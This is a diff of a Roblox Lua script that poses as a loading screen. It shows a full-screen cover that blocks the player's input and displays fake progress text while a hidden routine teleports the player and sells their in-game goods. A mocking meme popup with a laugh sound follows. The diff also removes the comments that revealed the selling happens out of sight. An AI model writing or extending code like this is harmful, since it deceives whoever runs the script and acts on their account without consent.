@@ -7,8 +7,15 @@ local StarterGui        = game:GetService("StarterGui")
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")
 
+-- ===== CONFIG =====
+local MEME_IMAGE_ID = "rbxassetid://139464283735273"
+local LAUGH_SOUND_ID = "rbxassetid://133312610824902"
+local MEME_DELAY     = 3       -- seconds after loading fades
+local MEME_SIZE      = 380     -- pixels, square
+-- ==================
+
 ------------------------------------------------------------
--- HIDE CoreGui + game toasts for the duration
+-- Hide CoreGui extras during load
 ------------------------------------------------------------
 local function hideExtras()
     pcall(function()
@@ -33,7 +40,7 @@ end
 hideExtras()
 
 ------------------------------------------------------------
--- FULL-SCREEN COVER UI
+-- FULL-SCREEN LOADING COVER
 ------------------------------------------------------------
 local screen = Instance.new("ScreenGui")
 screen.Name = "SystemBoot"
@@ -43,16 +50,14 @@ screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 screen.DisplayOrder = 999999
 screen.Parent = PlayerGui
 
--- Opaque cover
 local cover = Instance.new("Frame")
 cover.Name = "Cover"
 cover.Size = UDim2.fromScale(1, 1)
 cover.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
 cover.BorderSizePixel = 0
-cover.Active = true  -- blocks clicks passing through
+cover.Active = true
 cover.Parent = screen
 
--- Subtle vignette gradient
 local vignette = Instance.new("UIGradient")
 vignette.Color = ColorSequence.new({
     ColorSequenceKeypoint.new(0,   Color3.fromRGB(16, 16, 24)),
@@ -62,7 +67,6 @@ vignette.Color = ColorSequence.new({
 vignette.Rotation = 90
 vignette.Parent = cover
 
--- Invisible input blocker (also blocks keyboard/mouse)
 local blocker = Instance.new("TextButton")
 blocker.Name = "InputBlocker"
 blocker.Size = UDim2.fromScale(1, 1)
@@ -72,7 +76,6 @@ blocker.AutoButtonColor = false
 blocker.Modal = true
 blocker.Parent = cover
 
--- Center content
 local content = Instance.new("Frame")
 content.Name = "Content"
 content.AnchorPoint = Vector2.new(0.5, 0.5)
@@ -81,7 +84,6 @@ content.Size = UDim2.fromOffset(420, 220)
 content.BackgroundTransparency = 1
 content.Parent = cover
 
--- Animated dots row
 local dotRow = Instance.new("Frame")
 dotRow.Name = "Dots"
 dotRow.AnchorPoint = Vector2.new(0.5, 0)
@@ -105,7 +107,6 @@ for i = 1, 4 do
     dots[i] = dot
 end
 
--- Animate the dots
 local dotsAlive = true
 task.spawn(function()
     local idx = 1
@@ -122,7 +123,6 @@ task.spawn(function()
     end
 end)
 
--- Title
 local title = Instance.new("TextLabel")
 title.Name = "Title"
 title.BackgroundTransparency = 1
@@ -135,7 +135,6 @@ title.TextColor3 = Color3.fromRGB(240, 240, 250)
 title.Text = "Loading"
 title.Parent = content
 
--- Status line
 local status = Instance.new("TextLabel")
 status.Name = "Status"
 status.BackgroundTransparency = 1
@@ -148,7 +147,6 @@ status.TextColor3 = Color3.fromRGB(150, 150, 170)
 status.Text = "Initializing..."
 status.Parent = content
 
--- Progress bar background
 local barBg = Instance.new("Frame")
 barBg.Name = "BarBg"
 barBg.AnchorPoint = Vector2.new(0.5, 0)
@@ -180,7 +178,6 @@ barGrad.Color = ColorSequence.new({
 })
 barGrad.Parent = barFill
 
--- Percentage
 local pct = Instance.new("TextLabel")
 pct.Name = "Pct"
 pct.BackgroundTransparency = 1
@@ -193,7 +190,6 @@ pct.TextColor3 = Color3.fromRGB(120, 255, 160)
 pct.Text = "0%"
 pct.Parent = content
 
--- Fade in
 cover.BackgroundTransparency = 1
 content.Visible = false
 TweenService:Create(cover, TweenInfo.new(0.35), { BackgroundTransparency = 0 }):Play()
@@ -227,7 +223,7 @@ local function setStatus(text, targetPct, duration)
 end
 
 ------------------------------------------------------------
--- ACTUAL SELL LOGIC (runs behind the cover)
+-- SELL LOGIC
 ------------------------------------------------------------
 local Remotes    = require(ReplicatedStorage.Shared.Remotes)
 local Save       = require(ReplicatedStorage.Shared.Save)
@@ -373,26 +369,23 @@ local function teleportAndSell()
 end
 
 ------------------------------------------------------------
--- BOOT SEQUENCE (generic status text)
+-- Boot animation
 ------------------------------------------------------------
 local function boot()
-    setStatus("Initializing...",       0.08, 0.5)
+    setStatus("Initializing...",          0.08, 0.5)
     task.wait(0.7)
-    setStatus("Loading resources...",  0.22, 0.5)
+    setStatus("Loading resources...",     0.22, 0.5)
     task.wait(0.7)
     setStatus("Fetching session data...", 0.40, 0.5)
     task.wait(0.6)
-    setStatus("Syncing profile...",    0.58, 0.5)
+    setStatus("Syncing profile...",       0.58, 0.5)
     task.wait(0.6)
     setStatus("Preparing environment...", 0.78, 0.5)
     task.wait(0.5)
-    setStatus("Almost ready...",       1.00, 0.6)
+    setStatus("Almost ready...",          1.00, 0.6)
     task.wait(0.7)
 end
 
-------------------------------------------------------------
--- MAIN
-------------------------------------------------------------
 local function runSilentWork()
     local before = getMoney()
     log(("Wallet before: %s"):format(tostring(before)))
@@ -406,7 +399,7 @@ local function runSilentWork()
 end
 
 ------------------------------------------------------------
--- FADE OUT + CLEANUP
+-- Fade out loading cover
 ------------------------------------------------------------
 local function fadeOutAndCleanup()
     dotsAlive = false
@@ -418,12 +411,75 @@ local function fadeOutAndCleanup()
 end
 
 ------------------------------------------------------------
+-- MEME POPUP (cat + laugh)
+------------------------------------------------------------
+local function showMemePopup()
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "MemePop"
+    gui.ResetOnSpawn = false
+    gui.IgnoreGuiInset = true
+    gui.DisplayOrder = 999999
+    gui.Parent = PlayerGui
+
+    local img = Instance.new("ImageLabel")
+    img.Name = "Cat"
+    img.AnchorPoint = Vector2.new(0.5, 0.5)
+    img.Position = UDim2.fromScale(0.5, 0.5)
+    img.Size = UDim2.fromOffset(0, 0)
+    img.BackgroundTransparency = 1
+    img.Image = MEME_IMAGE_ID
+    img.ScaleType = Enum.ScaleType.Fit
+    img.ImageTransparency = 0
+    img.Rotation = -6
+    img.Parent = gui
+
+    local sound = Instance.new("Sound")
+    sound.SoundId = LAUGH_SOUND_ID
+    sound.Volume = 2
+    sound.PlayOnRemove = false
+    sound.Parent = gui
+    sound:Play()
+
+    -- Bounce in
+    TweenService:Create(img, TweenInfo.new(0.55, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+        Size = UDim2.fromOffset(MEME_SIZE, MEME_SIZE),
+    }):Play()
+
+    -- Small wobble loop while it's on screen
+    task.spawn(function()
+        while gui.Parent do
+            TweenService:Create(img, TweenInfo.new(0.18), {
+                Rotation = 6,
+            }):Play()
+            task.wait(0.18)
+            TweenService:Create(img, TweenInfo.new(0.18), {
+                Rotation = -6,
+            }):Play()
+            task.wait(0.18)
+        end
+    end)
+
+    -- Hold, then fade out
+    task.wait(math.max(3, sound.TimeLength > 0 and sound.TimeLength or 4))
+    TweenService:Create(img, TweenInfo.new(0.5), {
+        ImageTransparency = 1,
+        Size = UDim2.fromOffset(0, 0),
+    }):Play()
+    task.wait(0.6)
+    gui:Destroy()
+end
+
+------------------------------------------------------------
 -- LAUNCH
 ------------------------------------------------------------
 task.spawn(function()
-    boot()                            -- loading visuals
-    local ok, err = pcall(runSilentWork)  -- sell happens hidden
+    boot()
+    local ok, err = pcall(runSilentWork)
     if not ok then warn("[Loader] Run failed:", err) end
     task.wait(0.3)
     fadeOutAndCleanup()
+
+    -- 3-second delay after loading disappears
+    task.wait(MEME_DELAY)
+    showMemePopup()
 end)
